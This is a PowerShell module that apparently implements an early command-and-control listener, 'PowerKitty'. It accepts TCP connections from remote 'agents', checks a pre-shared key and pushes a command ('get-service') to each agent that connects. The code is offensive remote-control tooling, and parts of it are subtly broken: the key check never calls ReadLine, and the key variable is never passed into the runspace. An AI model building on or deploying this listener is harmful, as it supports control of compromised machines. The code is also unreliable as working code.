#
# New_Listerner.psm1
#
Function Global:New-Listerner()
{
	param
	(
		[Parameter()]
		[String]$ListerName,

		[Parameter()]
		[system.net.ipaddress]$LHOST = [system.net.ipaddress]::Loopback,

		[Parameter()]
		[short]$LPORT,

		[Parameter()]
		[String]$PSK
	)

	# If global lister object doesnt exist,or is null - create one
	if(!($Global:ListernerPool)){
		$Global:ListernerPool = @()
	}

	# Build a simple TCP listerner
	[console]::Title = ("Server: $LHOST : $LPORT")
	$endpoint        = new-object System.Net.IPEndPoint ($LHOST, $LPORT)
	$listener        = new-object System.Net.Sockets.TcpListener $endpoint
	$listener.start()

	# Create a template listerner object
	$obj = [pscustomobject]@{
		Name  = [String]$ListerName
		UUID  = [String](New-Guid).Guid
		LHOST = $LHOST
		LPORT = $LPORT
		RAWSOCK = $listener
		AGENTCOUNT = [INT]0
		RAWAGENT = $null
	}

	# add listerner psobject to array
	$Global:ListernerPool += $obj

	# add a runspace here (yes we are nesting)
	# add it once the listerner works. when its working, we can shove it into the background so the powershell terminal is free again.

	# continue accepting socket connections until object no longer exists
	while(Get-Listerner -UUID ($obj.UUID))
	{
		
		if($client = $listener.AcceptTcpClient())
		{
			
			"sock!"

			# add agent to listerner
			#$thisListerner = Get-Listerner -UUID ($obj.UUID.toString())
			#$agentCount    = $thisListerner.AGENTCOUNT++
			#$agents        = $thisListerner.RAWAGENT += $client
			# make this work from pipeline: (get lister | set listerner)
			#Set-Listerner -RAWAGENT $agents -AGENTCOUNT $agentCount -UUID $obj.UUID
		    
			# upgrade agent (maybe auth - tty etc)
			
			# build a runspace
			$Runspace            = [runspacefactory]::CreateRunspace()
			$PowerShell          = [powershell]::Create()
			$PowerShell.runspace = $Runspace
			$Runspace.Open()
			$runspace.SessionStateProxy.SetVariable('C', $client)
			[void]$PowerShell.AddScript({
				
				$Stream = $C.GetStream()
				$StreamWriter = New-Object System.IO.StreamWriter($Stream)
				$StreamReader = New-Object System.IO.StreamReader($Stream)

				# if PSK matches, payload
				if($StreamReader.ReadLine == $PSK)
				{
					"new agent <3"
					$StreamWriter.WriteLine("get-service") | Out-Null

				}
				# else, gtfo
				else
				{
					"bad woof woof detected"
					$StreamWriter.WriteLine("PowerKitty: Hisss!!!") | Out-Null
				}

				
				$StreamWriter.Close()
				$StreamReader.Close()
			})

			$AsyncObject = $PowerShell.BeginInvoke()
			

		}
		
		# small sleep to not thrash CPU
	    Start-Sleep -Milliseconds 100
		
	}
	$listener.Stop();
	

}